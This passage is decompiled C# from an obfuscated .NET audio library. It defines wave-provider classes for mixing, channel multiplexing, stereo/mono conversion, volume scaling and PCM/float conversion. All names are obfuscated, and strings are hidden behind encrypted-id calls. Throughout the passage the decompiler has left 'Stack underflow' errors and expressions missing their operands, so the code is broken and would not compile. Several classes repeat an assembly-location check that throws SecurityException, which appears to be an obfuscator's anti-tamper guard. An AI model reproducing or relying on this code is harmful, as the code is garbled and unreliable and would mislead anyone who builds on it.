				_0091_0002._009B_0005(this);
			}
		}

		void IDisposable.Dispose()
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			this._0001();
		}

		~_0019()
		{
			//IL_0008: Incompatible stack heights: 0 vs 1
			try
			{
				((_0019)/*Error near IL_000f: Stack underflow*/)._0001(_0002: false);
			}
			finally
			{
				global::_0008._009E(this);
			}
		}

		public int Read(byte[] _0002, int _0003, int _0004)
		{
			//IL_00a9: Incompatible stack heights: 0 vs 1
			//IL_00af: Incompatible stack heights: 0 vs 1
			//IL_00b5: Incompatible stack heights: 0 vs 1
			if (((_0019)/*Error near IL_000a: Stack underflow*/)._0001 == null)
			{
				global::_0010._0013 obj = ((_0019)/*Error near IL_001b: Stack underflow*/)._0001();
				((_0019)/*Error near IL_0020: Stack underflow*/)._0001 = obj;
				global::_0011._0018._0001(this);
			}
			int i = 0;
			if (this._0002 > 0)
			{
				i += global::_0011._0018._0001(_0002, _0004 - i, this, _0003);
			}
			for (; i < _0004; i += global::_0011._0018._0001(_0002, _0004 - i, this, _0003 + i))
			{
				global::_0016._0015 obj2 = global::_0011._0018._0001(this);
				if (obj2 == null)
				{
					global::_0011._0018._0001(this);
					i += global::_0011._0018._0001(_0002, _0004 - i, this, _0003 + i);
					break;
				}
				if (!this._0002)
				{
					global::_0011._0018._0001(this);
				}
				this._0001._0001(0, obj2, 0);
				_0098._008A_0004(obj2);
				this._0002();
			}
			return i;
		}

		internal int _0002()
		{
			//IL_0137: Incompatible stack heights: 0 vs 1
			global::_000F._000E[] array = new global::_000F._000E[1];
			global::_0011._0018._0001();
			global::_0016._0015 obj = (global::_0016._0015)/*Error near IL_013d: Stack underflow*/;
			global::_0018._0015 obj2 = global::_0011._0018._0001(this._0002.Length);
			obj._0001(obj2);
			obj._0001(this._0002);
			array[0]._0001 = obj;
			global::_0019._0013 obj3;
			int num = this._0001._0001(global::_007F._0012._0001, 1, array, out obj3);
			switch (num)
			{
			case -1072861838:
				_0098._008A_0004(obj2);
				_0098._008A_0004(obj);
				return 0;
			default:
				global::_0007._0097(num);
				break;
			case 0:
				break;
			}
			array[0]._0001._0001(out global::_0018._0015 obj4);
			obj4._0001(out var intPtr, out var _, out var num3);
			this._0002 = global::_0011._0018._0001(num3, this._0002);
			_0011_0003._008D_0006(intPtr, this._0002, 0, num3);
			this._0001 = 0;
			this._0002 = num3;
			obj4._0001();
			this._0002 += global::_0011._0018._0001(this._0002, WaveFormat);
			_0098._008A_0004(obj2);
			_0098._008A_0004(obj);
			_0098._008A_0004(obj4);
			return num3;
		}
	}
}
namespace _0018
{
	internal sealed class _000E : global::_001C._0004
	{
		internal List<global::_001C._0004> _0001;

		internal global::_0005._0005 _0001;

		private int _0001;

		public int InputCount
		{
			get
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_0012: Incompatible stack heights: 0 vs 1
				_ = ((_000E)/*Error near IL_0007: Stack underflow*/)._0001.Count;
				return (int)/*Error near IL_000a: Stack underflow*/;
			}
		}

		public global::_0005._0005 WaveFormat => ((_000E)/*Error near IL_0007: Stack underflow*/)._0001;

		public _000E()
		{
			this._0001 = global::_0011._0018._0001(44100, 2);
			_0001 = 4;
			this._0001 = new List<global::_001C._0004>();
		}

		public _000E(IEnumerable<global::_001C._0004> _0005_0090_0006)
			: this()
		{
			foreach (global::_001C._0004 item in _0005_0090_0006)
			{
				global::_0011._0018._0001(this, item);
			}
		}

		public int Read(byte[] _0002, int _0003, int _0004)
		{
			//IL_000f: Unknown result type (might be due to invalid IL or missing references)
			//IL_00b8: Incompatible stack heights: 0 vs 1
			//IL_00be: Incompatible stack heights: 0 vs 1
			//IL_00c8: Incompatible stack heights: 0 vs 1
			int num = ((_000E)/*Error near IL_000f: Stack underflow*/)._0001;
			if (/*Error near IL_0010: Stack underflow*/ % num != 0)
			{
				_0080._0014._0001(107387692);
				throw new ArgumentException(paramName: _0080._0014._0001(107388337), message: (string?)/*Error near IL_002b: Stack underflow*/);
			}
			_0007_0003._0086_0006(_0002, _0003, _0004);
			int num2 = 0;
			byte[] array = new byte[_0004];
			List<global::_001C._0004> list = this._0001;
			_0091_0002._009C_0005(list);
			try
			{
				foreach (global::_001C._0004 item in this._0001)
				{
					int num3 = item.Read(array, 0, _0004);
					num2 = _0016_0002._0019_0005(num2, num3);
					if (num3 > 0)
					{
						global::_0011._0018._0001(_0003, array, num3, _0002);
					}
				}
				return num2;
			}
			finally
			{
				_0091_0002._009D_0005(list);
			}
		}
	}
}
namespace _0012
{
	internal sealed class _0002 : _001C._0004
	{
		private readonly IList<_001C._0004> _0001;

		private readonly global::_0005._0005 _0001;

		internal readonly int _0001;

		internal readonly int _0002;

		internal readonly List<int> _0001;

		private readonly int _0003;

		private byte[] _0001;

		public global::_0005._0005 WaveFormat => ((_0002)/*Error near IL_0007: Stack underflow*/)._0001;

		public int InputChannelCount => ((_0002)/*Error near IL_0007: Stack underflow*/)._0002;

		public int OutputChannelCount => ((_0002)/*Error near IL_0007: Stack underflow*/)._0001;

		public _0002(IEnumerable<_001C._0004> _0005_0090_0006, int _0006_0090_0006)
		{
			this._0001 = new List<_001C._0004>(_0005_0090_0006);
			this._0001 = _0006_0090_0006;
			if (this._0001.Count == 0)
			{
				throw new ArgumentException(_0080._0014._0001(107387675));
			}
			if (_0006_0090_0006 < 1)
			{
				throw new ArgumentException(_0080._0014._0001(107387082));
			}
			foreach (_001C._0004 item in this._0001)
			{
				if (this._0001 == null)
				{
					if (item.WaveFormat._0001 == WaveFormatEncoding.Pcm)
					{
						this._0001 = new global::_0005._0005(item.WaveFormat._0001, item.WaveFormat._0003, _0006_0090_0006);
					}
					else
					{
						if (item.WaveFormat._0001 != WaveFormatEncoding.IeeeFloat)
						{
							throw new ArgumentException(_0080._0014._0001(107387065));
						}
						this._0001 = global::_0011._0018._0001(item.WaveFormat._0001, _0006_0090_0006);
					}
				}
				else
				{
					if (item.WaveFormat._0003 != this._0001._0003)
					{
						throw new ArgumentException(_0080._0014._0001(107386980));
					}
					if (item.WaveFormat._0001 != this._0001._0001)
					{
						throw new ArgumentException(_0080._0014._0001(107386927));
					}
				}
				_0002 += item.WaveFormat._0001;
			}
			_0003 = this._0001._0003 / 8;
			this._0001 = new List<int>();
			for (int i = 0; i < this._0001; i++)
			{
				this._0001.Add(i % _0002);
			}
		}

		public int Read(byte[] _0002, int _0003, int _0004)
		{
			//IL_0014: Unknown result type (might be due to invalid IL or missing references)
			//IL_0195: Incompatible stack heights: 0 vs 1
			//IL_019b: Incompatible stack heights: 0 vs 2
			//IL_01a1: Expected I4, but got Unknown
			_ = ((_0002)/*Error near IL_000a: Stack underflow*/)._0003;
			int num = ((_0002)/*Error near IL_0014: Stack underflow*/)._0001;
			int num2 = /*Error near IL_0015: Stack underflow*/* num;
			int num3 = _0004 / num2;
			int num4 = 0;
			int num5 = 0;
			IEnumerator<_001C._0004> enumerator = this._0001.GetEnumerator();
			try
			{
				while (global::_001B._007E_0086_0003(enumerator))
				{
					_001C._0004 current = enumerator.Current;
					int num6 = this._0003 * current.WaveFormat._0001;
					int num7 = num3 * num6;
					_0001 = global::_0011._0018._0001(num7, _0001);
					int num8 = current.Read(_0001, 0, num7);
					num5 = _0016_0002._0019_0005(num5, num8 / num6);
					for (int i = 0; i < current.WaveFormat._0001; i++)
					{
						int num9 = num4 + i;
						for (int j = 0; j < this._0001; j++)
						{
							if (this._0001[j] != num9)
							{
								continue;
							}
							int num10 = i * this._0003;
							int num11 = _0003 + j * this._0003;
							int k;
							for (k = 0; k < num3; k++)
							{
								if (num10 >= num8)
								{
									break;
								}
								_0099_0002._0010_0006(_0001, num10, _0002, num11, this._0003);
								num11 += num2;
								num10 += num6;
							}
							for (; k < num3; k++)
							{
								_0007_0003._0086_0006(_0002, num11, this._0003);
								num11 += num2;
							}
						}
					}
					num4 += current.WaveFormat._0001;
				}
			}
			finally
			{
				if (enumerator != null)
				{
					global::_0008._007E_0098(enumerator);
				}
			}
			return num5 * num2;
		}

		static _0002()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0017
{
	internal sealed class _000E : global::_001C._0004
	{
		[CompilerGenerated]
		private global::_0005._0005 _0001;

		public global::_0005._0005 WaveFormat
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_000E)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			[CompilerGenerated]
			private set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_000E)/*Error near IL_0009: Stack underflow*/)._0001 = (global::_0005._0005)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public _000E(global::_0005._0005 _0007_0090_0006)
		{
			WaveFormat = _0007_0090_0006;
		}

		public int Read(byte[] _0002, int _0003, int _0004)
		{
			//IL_0004: Unknown result type (might be due to invalid IL or missing references)
			//IL_001a: Incompatible stack heights: 0 vs 1
			//IL_001d: Incompatible stack heights: 0 vs 1
			//IL_0020: Expected I4, but got Unknown
			int num = /*Error near IL_0005: Stack underflow*/+ /*Error near IL_0005: Stack underflow*/;
			for (int i = _0003; i < num; i++)
			{
				_0002[i] = 0;
			}
			return _0004;
		}
	}
}
namespace _001D
{
	internal sealed class _0005 : _001C._0004
	{
		private readonly _001C._0004 _0001;

		private byte[] _0001;

		[CompilerGenerated]
		private float _0001;

		[CompilerGenerated]
		private float _0002;

		[CompilerGenerated]
		private global::_0005._0005 _0001;

		public float LeftVolume
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0005)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			[CompilerGenerated]
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0005)/*Error near IL_0009: Stack underflow*/)._0001 = (float)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public float RightVolume
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0005)/*Error near IL_0007: Stack underflow*/)._0002;
			}
			[CompilerGenerated]
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0005)/*Error near IL_0009: Stack underflow*/)._0002 = (float)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public global::_0005._0005 WaveFormat
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0005)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			[CompilerGenerated]
			private set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0005)/*Error near IL_0009: Stack underflow*/)._0001 = (global::_0005._0005)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public _0005(_001C._0004 _0002_0090_0006)
		{
			if (_0002_0090_0006.WaveFormat._0001 != WaveFormatEncoding.Pcm)
			{
				throw new ArgumentException(_0080._0014._0001(107386902));
			}
			if (_0002_0090_0006.WaveFormat._0001 != 2)
			{
				throw new ArgumentException(_0080._0014._0001(107387389));
			}
			if (_0002_0090_0006.WaveFormat._0003 != 16)
			{
				throw new ArgumentException(_0080._0014._0001(107387328));
			}
			this._0001 = _0002_0090_0006;
			WaveFormat = new global::_0005._0005(_0002_0090_0006.WaveFormat._0001, 1);
		}

		public int Read(byte[] _0002, int _0003, int _0004)
		{
			//IL_0006: Unknown result type (might be due to invalid IL or missing references)
			//IL_00c9: Incompatible stack heights: 0 vs 1
			//IL_00cf: Expected I4, but got Unknown
			//IL_00d5: Incompatible stack heights: 0 vs 1
			int num = /*Error near IL_0007: Stack underflow*/* 2;
			byte[] array = global::_0011._0018._0001(num, this._0001);
			((_0005)/*Error near IL_0022: Stack underflow*/)._0001 = array;
			_0080._0004 obj = new _0080._0004(this._0001);
			_0080._0004 obj2 = new _0080._0004(_0002);
			int num2 = this._0001.Read(this._0001, 0, num);
			int num3 = num2 / 2;
			int num4 = _0003 / 2;
			for (int i = 0; i < num3; i += 2)
			{
				short num5 = obj.ShortBuffer[i];
				short num6 = obj.ShortBuffer[i + 1];
				float num7 = (float)num5 * LeftVolume + (float)num6 * RightVolume;
				if (num7 > 32767f)
				{
					num7 = 32767f;
				}
				if (num7 < -32768f)
				{
					num7 = -32768f;
				}
				obj2.ShortBuffer[num4++] = (short)num7;
			}
			return num2 / 2;
		}

		static _0005()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0011
{
	internal sealed class _0002 : _001C._0004
	{
		private _001C._0004 _0001;

		private global::_0005._0005 _0001;

		private byte[] _0001;

		[CompilerGenerated]
		private float _0001;

		[CompilerGenerated]
		private float m__0002;

		public float LeftVolume
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0002)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			[CompilerGenerated]
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0002)/*Error near IL_0009: Stack underflow*/)._0001 = (float)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public float RightVolume
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0002)/*Error near IL_0007: Stack underflow*/).m__0002;
			}
			[CompilerGenerated]
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0002)/*Error near IL_0009: Stack underflow*/).m__0002 = (float)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public global::_0005._0005 WaveFormat => ((_0002)/*Error near IL_0007: Stack underflow*/)._0001;

		public _0002(_001C._0004 _0002_0090_0006)
		{
			if (_0002_0090_0006.WaveFormat._0001 != WaveFormatEncoding.Pcm)
			{
				throw new ArgumentException(_0080._0014._0001(107386902));
			}
			if (_0002_0090_0006.WaveFormat._0001 != 1)
			{
				throw new ArgumentException(_0080._0014._0001(107387299));
			}
			if (_0002_0090_0006.WaveFormat._0003 != 16)
			{
				throw new ArgumentException(_0080._0014._0001(107387328));
			}
			this._0001 = _0002_0090_0006;
			this._0001 = new global::_0005._0005(_0002_0090_0006.WaveFormat._0001, 2);
			RightVolume = 1f;
			LeftVolume = 1f;
		}

		public int Read(byte[] _0002, int _0003, int _0004)
		{
			//IL_0006: Unknown result type (might be due to invalid IL or missing references)
			//IL_00a2: Incompatible stack heights: 0 vs 1
			//IL_00a8: Expected I4, but got Unknown
			//IL_00ae: Incompatible stack heights: 0 vs 1
			int num = /*Error near IL_0007: Stack underflow*// 2;
			byte[] array = _0018._0001(num, this._0001);
			((_0002)/*Error near IL_0022: Stack underflow*/)._0001 = array;
			_0080._0004 obj = new _0080._0004(this._0001);
			_0080._0004 obj2 = new _0080._0004(_0002);
			int num2 = this._0001.Read(this._0001, 0, num) / 2;
			int num3 = _0003 / 2;
			for (int i = 0; i < num2; i++)
			{
				short num4 = obj.ShortBuffer[i];
				obj2.ShortBuffer[num3++] = (short)(LeftVolume * (float)num4);
				obj2.ShortBuffer[num3++] = (short)(RightVolume * (float)num4);
			}
			return num2 * 4;
		}
	}
}
namespace _001C
{
	internal sealed class _0006 : _0004
	{
		private readonly _0004 _0001;

		internal float _0001;

		public float Volume
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0006)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0006)/*Error near IL_0009: Stack underflow*/)._0001 = (float)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public global::_0005._0005 WaveFormat
		{
			get
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_0012: Incompatible stack heights: 0 vs 1
				_ = ((_0006)/*Error near IL_0007: Stack underflow*/)._0001.WaveFormat;
				return (global::_0005._0005)/*Error near IL_000a: Stack underflow*/;
			}
		}

		public _0006(_0004 _0002_0090_0006)
		{
			_0001 = 1f;
			this._0001 = _0002_0090_0006;
			if (_0002_0090_0006.WaveFormat._0001 != WaveFormatEncoding.Pcm)
			{
				throw new ArgumentException(_0080._0014._0001(107387270));
			}
			if (_0002_0090_0006.WaveFormat._0003 != 16)
			{
				throw new ArgumentException(_0080._0014._0001(107387241));
			}
		}

		public int Read(byte[] _0002, int _0003, int _0004)
		{
			//IL_00c0: Incompatible stack heights: 0 vs 1
			//IL_00c6: Incompatible stack heights: 0 vs 2
			//IL_00cc: Incompatible stack heights: 0 vs 1
			_ = ((_0006)/*Error near IL_000a: Stack underflow*/)._0001;
			int num = ((_0004)/*Error near IL_001a: Stack underflow*/).Read((byte[])/*Error near IL_001a: Stack underflow*/, (int)/*Error near IL_001a: Stack underflow*/, _0004);
			if (_0001 == 0f)
			{
				for (int i = 0; i < num; i++)
				{
					_0002[_0003++] = 0;
				}
			}
			else if (_0001 != 1f)
			{
				for (int j = 0; j < num; j += 2)
				{
					short num2 = (short)((_0002[_0003 + 1] << 8) | _0002[_0003]);
					float num3 = (float)num2 * _0001;
					num2 = (short)num3;
					if (_0001 > 1f)
					{
						if (num3 > 32767f)
						{
							num2 = short.MaxValue;
						}
						else if (num3 < -32768f)
						{
							num2 = short.MinValue;
						}
					}
					_0002[_0003++] = (byte)((uint)num2 & 0xFFu);
					_0002[_0003++] = (byte)(num2 >> 8);
				}
			}
			return num;
		}

		static _0006()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _000E
{
	internal sealed class _000F : global::_001C._0004
	{
		private readonly global::_001C._0004 _0001;

		private readonly global::_0005._0005 _0001;

		private volatile float _0001;

		private byte[] _0001;

		public global::_0005._0005 WaveFormat => ((_000F)/*Error near IL_0007: Stack underflow*/)._0001;

		public float Volume
		{
			get
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				return ((_000F)/*Error near IL_0009: Stack underflow*/)._0001;
			}
			set
			{
				//IL_000d: Incompatible stack heights: 0 vs 1
				//IL_0010: Incompatible stack heights: 0 vs 1
				((_000F)/*Error near IL_000b: Stack underflow*/)._0001 = (float)/*Error near IL_000b: Stack underflow*/;
			}
		}

		public _000F(global::_001C._0004 _0002_0090_0006)
		{
			if (_0002_0090_0006.WaveFormat._0001 != WaveFormatEncoding.IeeeFloat)
			{
				throw new ArgumentException(_0080._0014._0001(107387248), _0080._0014._0001(107387450));
			}
			if (_0002_0090_0006.WaveFormat._0003 != 32)
			{
				throw new ArgumentException(_0080._0014._0001(107387195), _0080._0014._0001(107387450));
			}
			this._0001 = new global::_0005._0005(_0002_0090_0006.WaveFormat._0001, 16, _0002_0090_0006.WaveFormat._0001);
			this._0001 = _0002_0090_0006;
			this._0001 = 1f;
		}

		public int Read(byte[] _0002, int _0003, int _0004)
		{
			//IL_0006: Unknown result type (might be due to invalid IL or missing references)
			//IL_00b0: Incompatible stack heights: 0 vs 1
			//IL_00b6: Expected I4, but got Unknown
			//IL_00bc: Incompatible stack heights: 0 vs 1
			int num = /*Error near IL_0007: Stack underflow*/* 2;
			byte[] array = global::_0011._0018._0001(num, _0001);
			((_000F)/*Error near IL_0022: Stack underflow*/)._0001 = array;
			int num2 = this._0001.Read(_0001, 0, num);
			_0080._0004 obj = new _0080._0004(_0001);
			_0080._0004 obj2 = new _0080._0004(_0002);
			int num3 = num2 / 4;
			int num4 = _0003 / 2;
			for (int i = 0; i < num3; i++)
			{
				float num5 = obj.FloatBuffer[i] * this._0001;
				if (num5 > 1f)
				{
					num5 = 1f;
				}
				if (num5 < -1f)
				{
					num5 = -1f;
				}
				obj2.ShortBuffer[num4++] = (short)(num5 * 32767f);
			}
			return num3 * 2;
		}
	}
}
namespace _001B
{
	internal sealed class _000E : _001C._0004
	{
		private _001C._0004 _0001;

		private readonly global::_0005._0005 _0001;

		private volatile float _0001;

		private byte[] _0001;

		public global::_0005._0005 WaveFormat => ((_000E)/*Error near IL_0007: Stack underflow*/)._0001;

		public float Volume
		{
			get
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				return ((_000E)/*Error near IL_0009: Stack underflow*/)._0001;
			}
			set
			{
				//IL_000d: Incompatible stack heights: 0 vs 1
				//IL_0010: Incompatible stack heights: 0 vs 1
				((_000E)/*Error near IL_000b: Stack underflow*/)._0001 = (float)/*Error near IL_000b: Stack underflow*/;
			}
		}

		public _000E(_001C._0004 _0002_0090_0006)
		{
			if (_0002_0090_0006.WaveFormat._0001 != WaveFormatEncoding.Pcm)
			{
				throw new ArgumentException(_0080._0014._0001(107386602));
			}
			if (_0002_0090_0006.WaveFormat._0003 != 16)
			{
				throw new ArgumentException(_0080._0014._0001(107386609));
			}
			this._0001 = global::_0011._0018._0001(_0002_0090_0006.WaveFormat._0001, (int)_0002_0090_0006.WaveFormat._0001);
			this._0001 = _0002_0090_0006;
			this._0001 = 1f;
		}

		public int Read(byte[] _0002, int _0003, int _0004)
		{
			//IL_0006: Unknown result type (might be due to invalid IL or missing references)
			//IL_008c: Incompatible stack heights: 0 vs 1
			//IL_0092: Expected I4, but got Unknown
			//IL_0098: Incompatible stack heights: 0 vs 1
			int num = /*Error near IL_0007: Stack underflow*// 2;
			byte[] array = global::_0011._0018._0001(num, _0001);
			((_000E)/*Error near IL_0022: Stack underflow*/)._0001 = array;
			int num2 = this._0001.Read(_0001, _0003, num);
			_0080._0004 obj = new _0080._0004(_0001);
			_0080._0004 obj2 = new _0080._0004(_0002);
			int num3 = num2 / 2;
			int num4 = _0003 / 4;
			for (int i = 0; i < num3; i++)
			{
				obj2.FloatBuffer[num4++] = (float)obj.ShortBuffer[i] / 32768f * this._0001;
			}
			return num3 * 4;
		}

		static _000E()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0080
{
	internal sealed class _0005 : _001C._0004
	{
		private global::_0013._0008 m__0001;

		private global::_0002._0008 m__0001;

		public global::_0005._0005 WaveFormat
		{
			get
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_0012: Incompatible stack heights: 0 vs 1
				_ = ((_0005)/*Error near IL_0007: Stack underflow*/).m__0001.WaveFormat;
				return (global::_0005._0005)/*Error near IL_000a: Stack underflow*/;
			}
		}

		public _0005(global::_0013._0008 _0008_0090_0006)
		{
			this.m__0001 = _0008_0090_0006;
			_0008_0090_0006.DataAvailable += _0001;
			this.m__0001 = new global::_0002._0008(WaveFormat);
		}

		private void _0001(object _0002, global::_0001._0006 _0003)
		{
			//IL_0023: Incompatible stack heights: 0 vs 1
			//IL_0029: Incompatible stack heights: 0 vs 1
			global::_0002._0008 obj = ((_0005)/*Error near IL_0007: Stack underflow*/).m__0001;
			byte[] array = ((global::_0001._0006)/*Error near IL_0010: Stack underflow*/)._0001;
			int num = _0003._0001;
			global::_0011._0018._0001(0, num, obj, array);
		}

		public int Read(byte[] _0002, int _0003, int _0004)
		{
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_0016: Incompatible stack heights: 0 vs 2
			//IL_0019: Incompatible stack heights: 0 vs 2
			_ = ((_0005)/*Error near IL_0007: Stack underflow*/).m__0001;
			_ = 0;
			return ((global::_0002._0008)/*Error near IL_0011: Stack underflow*/).Read((byte[])/*Error near IL_0011: Stack underflow*/, (int)/*Error near IL_0011: Stack underflow*/, (int)/*Error near IL_0011: Stack underflow*/);
		}
	}
}
namespace _001D
{
	internal abstract class _0006 : _001C._0004
	{
		internal global::_0005._0005 _0001;

		public global::_0005._0005 WaveFormat => ((_0006)/*Error near IL_0007: Stack underflow*/)._0001;

		public _0006()
			: this(44100, 1)
		{
		}

		public _0006(int _008E_008F_0006, int _008F_008F_0006)
		{
			global::_0011._0018._0001(_008F_008F_0006, this, _008E_008F_0006);
		}

		public int Read(byte[] _0002, int _0003, int _0004)
		{
			//IL_001e: Incompatible stack heights: 0 vs 1
			//IL_0025: Incompatible stack heights: 0 vs 1
			new _0080._0004((byte[])/*Error near IL_0025: Stack underflow*/);
			_0080._0004 obj = (_0080._0004)/*Error near IL_0028: Stack underflow*/;
			int num = _0004 / 2;
			return _0001(obj.ShortBuffer, _0003 / 2, num) * 2;
		}

		public abstract int _0001(short[] _0002, int _0003, int _0004);

		static _0006()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
	internal abstract class _0007 : _001C._0004, global::_0002._0007
	{
		internal global::_0005._0005 _0001;

		public global::_0005._0005 WaveFormat => ((_0007)/*Error near IL_0007: Stack underflow*/)._0001;

		public _0007()
			: this(44100, 1)
		{
		}

		public _0007(int _008E_008F_0006, int _008F_008F_0006)
		{
			global::_0011._0018._0001(_008F_008F_0006, this, _008E_008F_0006);
		}

		public int Read(byte[] _0002, int _0003, int _0004)
		{
			//IL_001e: Incompatible stack heights: 0 vs 1
			//IL_0025: Incompatible stack heights: 0 vs 1
			new _0080._0004((byte[])/*Error near IL_0025: Stack underflow*/);
			_0080._0004 obj = (_0080._0004)/*Error near IL_0028: Stack underflow*/;
			int num = _0004 / 4;
			return _0001(obj.FloatBuffer, _0003 / 4, num) * 4;
		}

		public abstract int _0001(float[] _0002, int _0003, int _0004);
	}
}
namespace _0006
{
	internal sealed class _0005 : IDisposable, global::_001C._0004
	{
		private global::_001A._0005 m__0001;

		private global::_001C._0004 m__0001;

		public global::_0005._0005 WaveFormat
		{
			get
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_0012: Incompatible stack heights: 0 vs 1
				_ = ((_0005)/*Error near IL_0007: Stack underflow*/).m__0001.WaveFormat;
				return (global::_0005._0005)/*Error near IL_000a: Stack underflow*/;
			}
		}

		public _0005(global::_001C._0004 _001D_0013, string _008B_0019_0006)
		{
			this.m__0001 = _001D_0013;
			this.m__0001 = new global::_001A._0005(_008B_0019_0006, _001D_0013.WaveFormat);
		}

		public int Read(byte[] _0002, int _0003, int _0004)
		{
			//IL_0028: Incompatible stack heights: 0 vs 1
			//IL_002b: Incompatible stack heights: 0 vs 2
			//IL_002e: Incompatible stack heights: 0 vs 1
			_ = ((_0005)/*Error near IL_0007: Stack underflow*/).m__0001;
			int num = ((global::_001C._0004)/*Error near IL_0011: Stack underflow*/).Read((byte[])/*Error near IL_0011: Stack underflow*/, (int)/*Error near IL_0011: Stack underflow*/, _0004);
			_0083._007E_0008_0004(this.m__0001, _0002, _0003, num);
			return num;
		}

		public void _0001()
		{
			//IL_0020: Incompatible stack heights: 0 vs 1
			//IL_0023: Incompatible stack heights: 0 vs 2
			if (((_0005)/*Error near IL_0007: Stack underflow*/).m__0001 != null)
			{
				_ = global::_0008._007E_0004_0002;
